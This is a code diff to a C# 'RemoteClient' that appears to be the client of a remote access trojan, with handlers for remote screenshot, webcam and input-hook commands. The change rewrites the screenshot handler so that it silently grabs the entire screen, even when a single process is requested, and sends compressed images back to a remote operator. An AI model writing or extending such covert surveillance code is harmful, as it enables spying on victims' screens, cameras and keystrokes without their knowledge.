@@ -30,6 +30,8 @@ namespace RemoteClient
             public int Right;
             public int Bottom;
         }
+        [DllImport("user32.dll")]
+        private static extern bool SetForegroundWindow(IntPtr hWnd);
 
         [DllImport("user32.dll")]
         private static extern IntPtr GetWindowDC(IntPtr hWnd);
@@ -447,79 +449,80 @@ namespace RemoteClient
                     Program.Unhook();
                 }
             }
-            else if (o.CommandType == "ProcessScreenshot")
-{
-    if (o.CommandName == "Capture")
-        try
-        {
-            string processId;
-            if (o.CommandData is object[] dataArray)
-                processId = dataArray[0].ToString();
-            else
-                processId = o.CommandData.ToString();
-
-            Debug.WriteLine($"Processing screenshot for process: {processId}");
-
-            var processIntId = int.Parse(processId);
-            var process = Process.GetProcessById(processIntId);
-            var hWnd = process.MainWindowHandle;
-
-            if (hWnd == IntPtr.Zero)
-            {
-                Debug.WriteLine($"No window found for process: {processId}");
-                return;
-            }
-
-            // Get window bounds
-            GetWindowRect(hWnd, out RECT rect);
-            int width = rect.Right - rect.Left;
-            int height = rect.Bottom - rect.Top;
-
-            using (Bitmap bmp = new Bitmap(width, height))
-            using (Graphics g = Graphics.FromImage(bmp))
-            {
-                IntPtr hdcBmp = g.GetHdc();
-                IntPtr hdcSrc = GetWindowDC(hWnd);
-
-                BitBlt(hdcBmp, 0, 0, width, height, hdcSrc, 0, 0, CopyPixelOperation.SourceCopy | CopyPixelOperation.CaptureBlt);
-
-                g.ReleaseHdc(hdcBmp);
-                ReleaseDC(hWnd, hdcSrc);
-
-                byte[] imageBytes;
-                using (var ms = new MemoryStream())
-                {
-                    using (var encoderParams = new EncoderParameters(1))
-                    using (var qualityParam = new EncoderParameter(Encoder.Quality, 80L))
-                    {
-                        var jpegCodec = GetEncoderInfo("image/jpeg");
-                        encoderParams.Param[0] = qualityParam;
-                        bmp.Save(ms, jpegCodec, encoderParams);
-                        imageBytes = ms.ToArray();
-                    }
-                }
-
-                SendMessage(new DataObject
-                {
-                    CommandType = "ProcessScreenshot",
-                    CommandName = "Result",
-                    CommandData = new object[] { processId, imageBytes }
-                });
-
-                Debug.WriteLine($"Window screenshot sent for process: {processId}");
-            }
-        }
-        catch (Exception ex)
-        {
-            Debug.WriteLine($"Error taking process screenshot: {ex.Message}");
-            SendMessage(new DataObject
-            {
-                CommandType = "ProcessScreenshot",
-                CommandName = "Error",
-                CommandData = new object[] { o.CommandData.ToString(), ex.Message }
-            });
-        }
-}
+           else if (o.CommandType == "ProcessScreenshot")
+           {
+               if (o.CommandName == "Capture")
+                   try
+                   {
+                       string processId = o.CommandData is object[] dataArray
+                           ? dataArray[0].ToString()
+                           : o.CommandData.ToString();
+           
+                       Debug.WriteLine($"Taking optimized screenshot for process: {processId}");
+           
+                       // Get screen dimensions
+                       Rectangle bounds = Screen.PrimaryScreen.Bounds;
+                       int width = bounds.Width;
+                       int height = bounds.Height;
+           
+                       // Create a scaled down version for faster transmission
+                       int scaledWidth = width / 2;  // 50% of original width
+                       int scaledHeight = height / 2; // 50% of original height
+           
+                       using (Bitmap fullBmp = new Bitmap(width, height))
+                       using (Graphics g = Graphics.FromImage(fullBmp))
+                       {
+                           g.CopyFromScreen(0, 0, 0, 0, new Size(width, height));
+           
+                           // Create scaled bitmap
+                           using (Bitmap scaledBmp = new Bitmap(scaledWidth, scaledHeight))
+                           using (Graphics scaledG = Graphics.FromImage(scaledBmp))
+                           {
+                               // Set high speed, lower quality interpolation
+                               scaledG.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Low;
+                               scaledG.DrawImage(fullBmp, 0, 0, scaledWidth, scaledHeight);
+           
+                               byte[] imageBytes;
+                               using (var ms = new MemoryStream())
+                               {
+                                   // Use lower JPEG quality and scaled image for faster transmission
+                                   using (var encoderParams = new EncoderParameters(1))
+                                   using (var qualityParam = new EncoderParameter(Encoder.Quality, 50L))
+                                   {
+                                       var jpegCodec = GetEncoderInfo("image/jpeg");
+                                       encoderParams.Param[0] = qualityParam;
+                                       scaledBmp.Save(ms, jpegCodec, encoderParams);
+                                       imageBytes = ms.ToArray();
+                                   }
+                               }
+           
+                               SendMessage(new DataObject
+                               {
+                                   CommandType = "ProcessScreenshot",
+                                   CommandName = "Result",
+                                   CommandData = new object[] 
+                                   { 
+                                       processId, 
+                                       imageBytes,
+                                       new Size(scaledWidth, scaledHeight) // Send scaled dimensions
+                                   }
+                               });
+           
+                               Debug.WriteLine($"Optimized screenshot sent ({imageBytes.Length} bytes) for process: {processId}");
+                           }
+                       }
+                   }
+                   catch (Exception ex)
+                   {
+                       Debug.WriteLine($"Error taking screenshot: {ex.Message}");
+                       SendMessage(new DataObject
+                       {
+                           CommandType = "ProcessScreenshot",
+                           CommandName = "Error",
+                           CommandData = new object[] { o.CommandData.ToString(), ex.Message }
+                       });
+                   }
+           }
            
             else if (o.CommandType == "Webcam")
             {
